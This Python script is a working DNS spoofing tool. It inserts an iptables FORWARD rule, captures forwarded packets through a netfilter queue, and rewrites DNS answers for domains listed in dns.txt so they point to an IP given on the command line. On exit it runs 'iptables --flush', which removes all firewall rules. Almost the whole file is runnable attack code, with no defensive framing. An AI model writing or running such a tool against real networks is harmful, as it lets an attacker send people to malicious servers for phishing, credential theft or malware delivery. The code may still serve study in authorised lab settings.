from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import sys

class DNSSpoofing:
    def __init__(self,directIP):
        self.queue = NetfilterQueue()
        self.dns_hosts = []
        self.directIP = directIP


    def fileToList(self):
        my_file = open("dns.txt", "r")
  
        # reading the file
        data = my_file.read()
        
        # replacing end splitting the text 
        # when newline ('\n') is seen.
        self.dns_hosts = data.split("\n")
        my_file.close()

        # Convert string to byte
        for i in range( len(self.dns_hosts)):
            self.dns_hosts[i] = self.dns_hosts[i].encode()

    def process_packet(self,packet):
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(DNSRR):
            # Print the package before and after get modify

            try:
                scapy_packet = self.modify_packet(scapy_packet)
            except IndexError:
                pass


            packet.set_payload(bytes(scapy_packet))

        packet.accept()


    def modify_packet(self,packet):

        # get the DNS question name, the domain name
        qname = packet[DNSQR].qname

        # Check DNS in DNS spoofing list
        if qname not in self.dns_hosts:
            # If this is not in our list then dont modify
            return packet

        # Modify the package 
        packet[DNS].an = DNSRR(rrname=qname, rdata=self.directIP)
        # set the answer count to 1
        packet[DNS].ancount = 1

        # delete checksums and length of packet, because we have modified the packet
        # new calculations are required ( scapy will do automatically )
        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum
        # return the modified packet
        return packet   

    def run(self):
        self.fileToList()
        print('------------------------------------------------------------------------------')
        print("Spoofing the following domains")
        for dnsName in self.dns_hosts:
            print(dnsName)
        print('------------------------------------------------------------------------------')
        try:
 
            self.queue.bind(0, self.process_packet)
            self.queue.run()
        except KeyboardInterrupt:
            # if want to exit, make sure we
            # remove that rule we just inserted, going back to normal.
            os.system("iptables --flush")




if __name__ == "__main__":


    # insert the iptables FORWARD rule
    os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num {}".format(0))

    # instantiate the netfilter queue
    dnsSpoofing = DNSSpoofing(sys.argv[1])
    dnsSpoofing.run()